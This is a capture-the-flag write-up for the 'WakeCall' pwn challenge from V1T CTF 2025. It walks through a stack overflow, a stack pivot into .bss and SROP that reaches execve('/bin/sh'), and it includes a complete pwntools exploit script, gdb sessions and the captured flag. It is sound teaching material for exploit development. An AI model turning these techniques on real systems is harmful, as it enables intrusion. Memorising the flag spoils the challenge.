# WakeCall - V1T CTF 2025 Writeup

## Challenge Information
- **Name:** WakeCall
- **Category:** PWN
- **Difficulty:** Medium
- **Points:** Unknown
- **Description:** "Quack off, I'm debugging my reflection in the pond."

---

## Table of Contents
1. [Initial Analysis](#initial-analysis)
2. [Static Analysis](#static-analysis)
3. [Understanding the Vulnerability](#understanding-the-vulnerability)
4. [The Core Technique: Stack Pivoting](#the-core-technique-stack-pivoting)
5. [Understanding SROP](#understanding-srop)
6. [Dynamic Analysis & Verification](#dynamic-analysis--verification)
7. [The Complete Exploit](#the-complete-exploit)
8. [Common Mistakes & What I Did Wrong](#common-mistakes--what-i-did-wrong)
9. [Key Takeaways](#key-takeaways)

---

## Initial Analysis

### File Information
```bash
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

### Security Protections
```bash
$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH
```

**Key Observations:**
- ✅ **No Stack Canary** - We can overflow without detection
- ✅ **NX Enabled** - Stack is not executable (can't run shellcode)
- ✅ **No PIE** - Fixed addresses, no ASLR for code/data sections
- ✅ **Not Stripped** - Function names available for analysis

---

## Static Analysis

### Disassembly of Main Function

```asm
00000000004011f7 <main>:
  4011fb:  push   rbp
  4011fc:  mov    rbp,rsp
  4011ff:  add    rsp,0xffffffffffffff80    ; Allocate 128 bytes (rbp-0x80)
  
  401203:  lea    rax,[rip+0xdfe]
  40120a:  mov    rdi,rax
  40120d:  call   401070 <puts@plt>         ; Print "Quack off..."
  
  401212:  lea    rax,[rbp-0x80]            ; ← KEY: Buffer = rbp - 0x80
  401216:  mov    edx,0x3e8                 ; size = 1000 bytes
  40121b:  mov    rsi,rax                   ; buf = rax
  40121e:  mov    edi,0x0                   ; fd = stdin
  401223:  call   4010a0 <read@plt>         ; read(0, rbp-0x80, 1000)
  
  401228:  mov    eax,0x0
  40122d:  leave                            ; ← KEY: mov rsp,rbp; pop rbp
  40122e:  ret                              ; ← KEY: pop rip
```

### Available Gadgets

```bash
$ ROPgadget --binary chall | grep -E "pop rax|syscall|pop rbp"
0x00000000004011ef : pop rax ; ret
0x00000000004011f1 : syscall
0x000000000040117d : pop rbp ; ret
```

**Perfect for SROP!** We have:
- `pop rax; ret` - To set RAX = 15 (rt_sigreturn)
- `syscall` - To call the syscall
- `pop rbp; ret` - To control RBP (for stack pivot)

### Memory Sections

```bash
$ readelf -S chall | grep bss
[25] .bss              NOBITS           0000000000404020  00003020
```

The `.bss` section:
- **Address:** 0x404020
- **Size:** 0x30 (48 bytes)
- **Writable:** Yes ✓
- **Fixed Address:** Yes (No PIE) ✓

---

## Understanding the Vulnerability

### The Buffer Overflow

**Allocated space:** 128 bytes (`rbp - 0x80`)  
**Read size:** 1000 bytes (`0x3e8`)  
**Overflow:** 1000 - 128 = **872 bytes of overflow!**

### Stack Layout

```
Lower Memory Addresses (Top of Stack)
    ↓
    
0x7fffffffe000:  [Buffer starts here]     ← 128 bytes allocated
0x7fffffffe008:  [Buffer data]
    ...
0x7fffffffe078:  [Buffer ends here]
0x7fffffffe080:  [Saved RBP]              ← 8 bytes
0x7fffffffe088:  [Return Address]         ← 8 bytes
0x7fffffffe090:  [Caller's stack frame]

    ↑
Higher Memory Addresses (Bottom of Stack)
```

**Offset Calculation:**
- Buffer size: 128 bytes
- To saved RBP: 128 bytes (offset = 128)
- To return address: 136 bytes (offset = 136)

### What Can We Overwrite?

```python
payload = b'A' * 128          # Fill buffer
payload += b'BBBBBBBB'        # Overwrite saved RBP (bytes 128-135)
payload += b'CCCCCCCC'        # Overwrite return address (bytes 136-143)
payload += b'D' * 856         # Rest of overflow space
```

---

## The Core Technique: Stack Pivoting

### The Problem We Need to Solve

**Initial Issue:**
- Our payload is written to the **stack** (random address due to ASLR)
- We need "/bin/sh" at a **known address** for execve
- Stack addresses are randomized - we can't hardcode them in SROP

**Solution:**
- Make the **second** read() write to `.bss` (fixed address)
- Control where the buffer is by controlling **RBP**

### Understanding How RBP Controls Buffer Location

Look at this instruction carefully:
```asm
401212:  lea    rax,[rbp-0x80]    ; Buffer address = RBP - 0x80
```

**Key Insight:** The buffer address is **calculated from RBP**!

- If RBP = 0x7fffffffe080 (stack), buffer = 0x7fffffffe000 (stack)
- If RBP = 0x4040d0 (.bss), buffer = 0x404050 (.bss) ← **We want this!**

### How to Control RBP

Remember what `leave` does:
```asm
leave    ; Equivalent to:
         ; mov rsp, rbp
         ; pop rbp        ← This is where RBP gets a new value!
```

**The `pop rbp` instruction loads RBP from the stack!**

So if we overwrite the saved RBP with 0x4040d0:
1. `leave` executes
2. `pop rbp` loads 0x4040d0 into RBP
3. We now control RBP!

### The Two-Stage Attack

**Stage 1: Pivot to .bss**
```python
payload1 = b"A" * 136                # Fill buffer + saved RBP
payload1 += p64(0x40117d)            # Return to: pop rbp; ret
payload1 += p64(0x4040d0)            # Value to pop into RBP
payload1 += p64(0x401212)            # Return to middle of main
```

**Execution Flow:**
1. First read() completes (payload on stack)
2. `leave; ret` executes
3. Control returns to `0x40117d` (pop rbp; ret)
4. RBP becomes 0x4040d0
5. Execution jumps to 0x401212 (middle of main)

**At 0x401212 (second time):**
```asm
401212:  lea    rax,[rbp-0x80]    ; rax = 0x4040d0 - 0x80 = 0x404050
401223:  call   read@plt           ; read(0, 0x404050, 1000)
```

**Now the second read() writes to 0x404050 in .bss!**

### Memory Layout After Stage 1

```
Before pivot:              After pivot:
RBP = 0x7ffe080 (stack)   RBP = 0x4040d0 (.bss)
Buffer = stack            Buffer = 0x404050 (.bss)
Address = unknown         Address = KNOWN! ✓
```

### Why This Works

**Question:** Why set RBP = 0x4040d0 specifically?

**Answer:** Math!
- We want buffer at 0x404050 (safe area in/after .bss)
- Buffer = RBP - 0x80
- So: RBP = 0x404050 + 0x80 = 0x4040d0

**Verification:**
```python
>>> hex(0x4040d0 - 0x80)
'0x404050'  ✓
```

---

## Understanding SROP

### What is SROP?

**SROP (Sigreturn Oriented Programming)** is a technique that exploits the Linux `rt_sigreturn` syscall to control ALL registers at once.

### Background: Signal Handling in Linux

When a signal interrupts a program (like Ctrl+C):

1. **Kernel saves context** - All registers saved to stack in a "signal frame"
2. **Signal handler runs** - Program handles the signal
3. **Kernel restores context** - `rt_sigreturn` syscall restores all registers
4. **Program continues** - As if nothing happened

### The Exploit: Fake Signal Frame

**The trick:** We can create a FAKE signal frame and call `rt_sigreturn` ourselves!

```c
// Syscall number 15 = rt_sigreturn
// When called, kernel reads 248-byte structure from stack
// and restores ALL registers from it!
```

### Creating a Signal Frame

Using pwntools:
```python
from pwn import *

frame = SigreturnFrame()
frame.rax = 59              # execve syscall number
frame.rdi = 0x404050        # Pointer to "/bin/sh"
frame.rsi = 0               # argv = NULL
frame.rdx = 0               # envp = NULL
frame.rip = 0x4011f1        # Where to jump (syscall gadget)
frame.rsp = 0x404500        # Stack pointer

bytes(frame)  # Returns 248 bytes
```

**When rt_sigreturn executes with this frame:**
- RAX becomes 59
- RDI becomes 0x404050
- RSI becomes 0
- RDX becomes 0
- RIP becomes 0x4011f1 (syscall)
- All other registers also set!

### SROP Execution Flow

**Step 1: Set RAX = 15**
```python
payload = p64(0x4011ef)  # pop rax; ret
        + p64(0xf)       # Value 15
```

**Step 2: Call syscall**
```python
payload += p64(0x4011f1)  # syscall (with RAX=15 = rt_sigreturn)
```

**Step 3: Kernel reads our frame**
- RSP points to our fake signal frame
- Kernel restores all registers from the frame
- RIP is set to our specified value

**Step 4: Second syscall**
- After SROP, RAX = 59 (execve)
- RIP = syscall gadget
- syscall executes → calls execve!

### Why SROP is Powerful

**Traditional ROP requires:**
- `pop rdi; ret` to control RDI
- `pop rsi; ret` to control RSI  
- `pop rdx; ret` to control RDX
- `pop rcx; ret` to control RCX
- etc...

**SROP only requires:**
- `pop rax; ret` (to set RAX = 15)
- `syscall` (to trigger rt_sigreturn)

**Result:** Control ALL registers with just 2 gadgets!

### When to Use SROP

✅ **Use SROP when:**
- Limited gadgets available
- Have `syscall` and `pop rax` (or similar)
- Need to set multiple registers
- Static binary with few useful gadgets

❌ **Don't use SROP when:**
- Have full set of pop gadgets
- Can use ret2libc easily
- No syscall gadget available
- Overflow size < 248 bytes (SROP frame won't fit)

---

## Dynamic Analysis & Verification

### Phase 1: Verify the Overflow

```bash
gdb ./chall
```

```gdb
pwndbg> cyclic 200
pwndbg> run
# Paste the cyclic pattern
pwndbg> cyclic -l [value from crash]
# Should show offset = 136
```

### Phase 2: Verify Stack Pivot

```python
# test_pivot.py
from pwn import *
io = process('./chall')
payload = b'A'*136 + p64(0x40117d) + p64(0x4040d0) + p64(0x401212)
io.sendafter(b'pond.\n', payload)
```

```gdb
pwndbg> break *0x401212   # Before lea rax,[rbp-0x80]
pwndbg> run < <(python3 test_pivot.py)

# First time at breakpoint (normal execution)
pwndbg> print $rbp
$1 = 0x7fffffffe080   # Stack address

pwndbg> continue
# Second time at breakpoint (after pivot!)
pwndbg> print $rbp
$2 = 0x4040d0         # .bss address! ✓

pwndbg> print/x $rbp - 0x80
$3 = 0x404050         # Buffer will be here!
```

### Phase 3: Verify "/bin/sh" is Written

```gdb
pwndbg> break *0x401228    # After read() returns
pwndbg> continue

# Check if "/bin/sh" is at 0x404050
pwndbg> x/s 0x404050
0x404050:       "/bin/sh"  ✓

# Verify memory contents
pwndbg> x/40gx 0x404050
0x404050:       0x0068732f6e69622f  # "/bin/sh\x00"
0x404058:       0x0000000000000000  # Padding
...
```

### Phase 4: Verify SROP Frame

```gdb
pwndbg> break *0x4011f1    # At syscall
pwndbg> continue

# First syscall - should be rt_sigreturn
pwndbg> info registers
rax            0xf              # 15 = rt_sigreturn ✓
rsp            0x4040f0         # Points to SROP frame ✓

pwndbg> continue

# Second syscall - should be execve
pwndbg> info registers
rax            0x3b             # 59 = execve ✓
rdi            0x404050         # Points to "/bin/sh" ✓
rsi            0x0              # NULL ✓
rdx            0x0              # NULL ✓

# Verify RDI points to our string
pwndbg> x/s $rdi
0x404050:       "/bin/sh"  ✓

pwndbg> continue
# Shell should spawn! ✓
```

### Phase 5: Debugging Failed Attempts

**If execve returns an error:**

```gdb
pwndbg> break *0x4011f1
pwndbg> continue
pwndbg> ni   # Step through syscall
pwndbg> print $rax
$1 = -2      # ENOENT = File not found

# Check what RDI points to
pwndbg> x/s $rdi
0x404060:    ""   # EMPTY! Bug found!
```

**Common syscall error codes:**
- `-2` (ENOENT) = File/string not found
- `-14` (EFAULT) = Bad address
- `-22` (EINVAL) = Invalid argument

---

## The Complete Exploit

### Final Working Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Connect to challenge
io = remote('chall.v1t.site', 30211)
# io = process('./chall')

# ============= STAGE 1: Stack Pivot =============
log.info("Stage 1: Pivoting stack to .bss")

payload1 = b"A" * 136                    # Fill buffer to return address
payload1 += p64(0x40117d)                # pop rbp; ret
payload1 += p64(0x404050 + 0x80)         # New RBP = 0x4040d0
payload1 += p64(0x401212)                # Return to middle of main

io.sendlineafter(b"pond.\n", payload1)

# ============= STAGE 2: SROP for execve =============
log.info("Stage 2: Sending /bin/sh and SROP frame")

# Create SROP frame
frame = SigreturnFrame()
frame.rax = 0x3b        # execve syscall (59)
frame.rdi = 0x404050    # Pointer to "/bin/sh"
frame.rsi = 0           # argv = NULL
frame.rdx = 0           # envp = NULL
frame.rip = 0x4011f1    # syscall gadget

# Build second payload
payload2 = b"/bin/sh\x00".ljust(8, b'\x00')  # 8 bytes: string at 0x404050
payload2 += p64(0x0) * 16                     # 128 bytes: padding (16 * 8 = 128)
payload2 += p64(0x4011ef)                     # 8 bytes: pop rax; ret at 0x4040d8
payload2 += p64(0xf)                          # 8 bytes: value 15
payload2 += p64(0x4011f1)                     # 8 bytes: syscall
payload2 += bytes(frame)                      # 248 bytes: SROP frame

io.sendline(payload2)

# ============= Get Shell =============
log.success("Popping shell!")
io.interactive()
```

### Payload Breakdown

**Payload 1 Structure:**
```
[136 bytes padding][pop rbp; ret][0x4040d0][0x401212]
 └─ Fill buffer     └─ Gadget    └─ RBP    └─ Return address
```

**Payload 2 Memory Layout (after write to 0x404050):**
```
Offset  | Address  | Content              | Purpose
--------|----------|----------------------|------------------
0       | 0x404050 | "/bin/sh\x00"        | String for execve
8-135   | 0x404058 | 0x00 (padding)       | Alignment
136     | 0x4040d8 | 0x4011ef             | pop rax; ret
144     | 0x4040e0 | 0x0f                 | Value 15
152     | 0x4040e8 | 0x4011f1             | syscall
160     | 0x4040f0 | [SROP frame]         | 248 bytes
```

### Execution Trace

```
1. First read() writes payload1 to stack
2. main returns via leave; ret
3. pop rbp; ret executes → RBP = 0x4040d0
4. Jump to 0x401212 (middle of main)
5. lea rax,[rbp-0x80] → rax = 0x404050
6. Second read() writes payload2 to 0x404050
7. main returns via leave; ret
8. RSP = 0x4040d8 (our ROP chain!)
9. pop rax; ret → RAX = 15
10. syscall (rt_sigreturn) → Restores all registers from frame
11. syscall (execve) → Spawns shell!
```

### Flag

```bash
$ python3 exploit.py
[+] Opening connection to chall.v1t.site on port 30211: Done
[*] Stage 1: Pivoting stack to .bss
[*] Stage 2: Sending /bin/sh and SROP frame
[+] Popping shell!
[*] Switching to interactive mode
$ cat flag.txt
V1T{w4k3c4ll_s1gr3t_8b21799b5ad6fb6faa570fcbf0a0dcf5}
```

---

## Common Mistakes & What I Did Wrong

### Mistake #1: Incorrect Padding Calculation

**What I did wrong:**
```python
# My broken attempt
payload2 = b"/bin/sh\x00"                # 8 bytes
payload2 += b'\x00' * (136 - len(payload2))  # Wrong padding!
payload2 += p64(pop_rax)                 # Wrong offset!
```

**The problem:**
- I calculated padding to reach offset 136 from START of payload
- But the second read() is 1000 bytes, not 136!
- The padding calculation was completely wrong

**The correct approach:**
```python
# Working solution
payload2 = b"/bin/sh\x00".ljust(8, b'\x00')  # 8 bytes at 0x404050
payload2 += p64(0x0) * 16                     # 128 bytes padding (0x80)
payload2 += p64(0x4011ef)                     # Now at 0x4040d8 = 0x404050 + 0x88
```

**Why it's correct:**
- "/bin/sh\x00" = 8 bytes at 0x404050
- Padding = 128 bytes (16 qwords) from 0x404058 to 0x4040d7
- Total before ROP chain = 136 bytes (0x88)
- ROP chain starts at 0x404050 + 0x88 = 0x4040d8
- This is exactly where RSP will be after leave!

**The math:**
```
RBP = 0x4040d0
After leave: RSP = 0x4040d8 (RBP + 8)
Our ROP chain must start at 0x4040d8
0x4040d8 - 0x404050 = 0x88 = 136 bytes
So: 8 bytes string + 128 bytes padding = 136 bytes total
```

**Lesson:** When calculating offsets, think about WHERE in memory each byte goes, not just "how many bytes before the gadget."

### Mistake #2: Not Verifying Memory Contents

**What I did wrong:**
```python
# My failed attempt
frame.rdi = 0x404060  # Point to .bss
# ... but I never wrote "/bin/sh" there!
```

**The problem:**
- I assumed "/bin/sh" would be at 0x404060
- I never actually WROTE it there
- execve failed with ENOENT (file not found)

**What I should have done:**
```gdb
pwndbg> break *0x4011f1  # Before syscall
pwndbg> x/s $rdi         # Check what RDI points to
0x404060:    ""          # EMPTY! Found the bug!
```

**Lesson:** Always verify your assumptions with dynamic analysis!

### Mistake #2: Skipping the Stack Pivot

**What I did wrong:**
- Tried to point directly to .bss in SROP frame
- But my payload was written to the stack, not .bss
- The string was on the stack (unknown address), not at 0x404060

**Why it failed:**
```
My exploit: 
  Payload on stack → SROP points to .bss → .bss is empty → Fail

Correct approach:
  Payload 1 on stack → Pivot → Payload 2 in .bss → SROP points to .bss → Success!
```

**What I should have understood:**
- You can't just "point" to an address and expect data there
- You need to actually WRITE the data there first
- The stack pivot makes the second read() write to a known address

### Mistake #3: Not Understanding How `leave` Works

**Initial confusion:**
- I knew `leave` affected RBP
- But I didn't understand HOW to exploit it
- I didn't realize controlling saved RBP would affect the NEXT function execution

**The insight I missed:**
```asm
leave    ; mov rsp,rbp; pop rbp
         ; The 'pop rbp' loads from the stack!
         ; If we control the stack, we control RBP!
```

**What I should have done:**
- Trace through `leave` instruction step-by-step in GDB
- Watch how RBP changes
- See how the new RBP affects `lea rax,[rbp-0x80]`

### Mistake #4: Insufficient Dynamic Analysis

**What I did:**
- ✅ Static analysis (found gadgets, vulnerability)
- ❌ Dynamic analysis (didn't test assumptions)
- ❌ Debugging (didn't check why it failed)

**What I should have done:**
```gdb
# Test each stage separately
1. Test overflow → Confirm offset is 136
2. Test RBP control → Confirm RBP becomes 0x4040d0
3. Test buffer location → Confirm buffer is at 0x404050
4. Test string write → Confirm "/bin/sh" at 0x404050
5. Test SROP → Confirm registers are correct
6. Test execve → Confirm it executes properly
```

### Mistake #5: Not Checking Syscall Return Values

**What I did wrong:**
- Syscall failed
- I didn't check the return value (RAX)
- I didn't know WHY it failed

**What I should have done:**
```gdb
pwndbg> break *0x4011f3  # After syscall returns
pwndbg> continue
pwndbg> print $rax
$1 = -2                  # Error code!

# Look up error code
# -2 = ENOENT = No such file or directory
# This means the file path is wrong or doesn't exist!
```

**Common error codes to know:**
- `0` = Success
- `-2` = ENOENT (file not found)
- `-14` = EFAULT (bad address)
- `-22` = EINVAL (invalid argument)

---

## What I Should Do Next Time

### Proper CTF Methodology

**Phase 1: Static Analysis (30%)**
1. ✅ Check binary protections (checksec)
2. ✅ Find vulnerability (buffer overflow, format string, etc.)
3. ✅ Find useful gadgets (ROPgadget)
4. ✅ Identify writable memory (.bss, .data)
5. ✅ Plan attack strategy

**Phase 2: Dynamic Analysis (50%)**
1. ✅ Verify overflow offset (cyclic pattern)
2. ✅ Test gadgets work (step through in GDB)
3. ✅ Verify memory contents (x/s, x/gx commands)
4. ✅ Check register values before critical calls
5. ✅ Debug failures (check error codes, return values)
6. ✅ Test incrementally (one stage at a time)

**Phase 3: Exploitation (20%)**
1. ✅ Write clean exploit code
2. ✅ Add logging for debugging
3. ✅ Test locally first
4. ✅ Adapt for remote if needed

### Verification Checklist

Before claiming an exploit works:

**Memory Verification:**
- [ ] Is my payload at the address I expect?
- [ ] Is my string at the address I'm pointing to?
- [ ] Are my gadget addresses correct?

**Register Verification:**
- [ ] Is RAX set to the correct syscall number?
- [ ] Does RDI point to valid data?
- [ ] Are RSI and RDX set correctly?
- [ ] Is RIP pointing where I want?

**Execution Verification:**
- [ ] Does each gadget execute as expected?
- [ ] Do syscalls return success (RAX = 0 or positive)?
- [ ] Does the final syscall achieve the goal?

### GDB Commands to Master

**Essential debugging commands:**
```gdb
# Breakpoints
break *0x401234          # Break at address
break main               # Break at function

# Execution
run                      # Start program
continue / c             # Continue execution
ni                       # Next instruction (step over)
si                       # Step instruction (step into)

# Inspection
info registers           # Show all registers
print $rax               # Print RAX value
x/s $rdi                 # Examine string at RDI
x/10gx $rsp              # Examine 10 qwords at RSP
x/20i $rip               # Examine 20 instructions at RIP

# Memory
search-pattern "/bin/sh" # Find string in memory
vmmap                    # Show memory mappings
telescope $rsp 20        # Show stack (pwndbg)
```

### Key Principles

1. **Never assume, always verify**
   - Don't trust your code works - prove it in GDB

2. **Test incrementally**
   - Test each stage separately
   - Don't write the full exploit at once

3. **Understand, don't memorize**
   - Know WHY techniques work, not just HOW
   - Trace through execution step by step

4. **Debug scientifically**
   - When something fails, find out WHY
   - Use error codes and return values
   - Check memory contents and register values

5. **Document your process**
   - Write down what you tried
   - Note what worked and what didn't
   - Learn from failures

---

## Key Takeaways

### Technical Skills Learned

1. **Stack Pivoting via RBP Control**
   - How `leave` instruction works
   - How to control RBP through saved RBP on stack
   - How RBP affects buffer location in subsequent calls

2. **SROP (Sigreturn Oriented Programming)**
   - What rt_sigreturn syscall does
   - How to create fake signal frames
   - When SROP is the best technique

3. **Two-Stage Exploits**
   - First stage: Setup (pivot stack)
   - Second stage: Payload (execute attack)

4. **Dynamic Analysis with GDB**
   - How to verify assumptions
   - How to debug failed exploits
   - How to trace execution flow

### Methodology Lessons

1. **Static analysis finds possibilities**
2. **Dynamic analysis confirms reality**
3. **Testing incrementally saves time**
4. **Understanding beats memorization**

### Common Pitfalls to Avoid

1. ❌ Assuming data is where you think it is
2. ❌ Skipping dynamic verification
3. ❌ Not checking syscall return values
4. ❌ Writing full exploit before testing stages
5. ❌ Not understanding how instructions work

### Questions to Always Ask

**Before writing exploit:**
- Where will my payload be written?
- Where is my data located?
- Do I know all addresses I need?

**While debugging:**
- What is the value of each register?
- What data is at the address I'm using?
- What error code did the syscall return?

**After failure:**
- Why did it fail (not just "it doesn't work")?
- What assumption was wrong?
- How can I verify the fix?

---

## Additional Resources

### Tools Used
- **pwntools** - Python exploit development framework
- **pwndbg** - GDB plugin for exploit development
- **ROPgadget** - Find ROP gadgets in binaries
- **checksec** - Check binary security features

### Further Reading
- [SROP Exploitation](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf) - Original SROP paper
- [Stack Pivoting Techniques](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [Understanding leave and ret](https://stackoverflow.com/questions/29790229/what-is-the-purpose-of-the-leave-instruction-in-x86-assembly)

### Practice Challenges
- Look for challenges with:
  - Limited gadgets (only syscall + pop rax)
  - Names hinting at signals/return/frames
  - Static binaries with few gadgets
  - "Call" or "Wake" in the name

---

## Conclusion

This challenge taught the importance of:
1. **Understanding fundamentals** (how leave, RBP, stack frames work)
2. **Proper verification** (dynamic analysis in GDB)
3. **Creative techniques** (stack pivoting to known addresses)
4. **Systematic debugging** (testing each stage, checking errors)

The key insight: **Don't just write exploits, understand them.**

When your exploit fails, it's not just a bug - it's a learning opportunity. Debug it, understand why it failed, and you'll become a better CTF player.

Remember: **"If you can't debug it, you don't understand it."**

---
 
**Challenge:** WakeCall - V1T CTF 2025  
**Flag:** `V1T{w4k3c4ll_s1gr3t_8b21799b5ad6fb6faa570fcbf0a0dcf5}`  

---
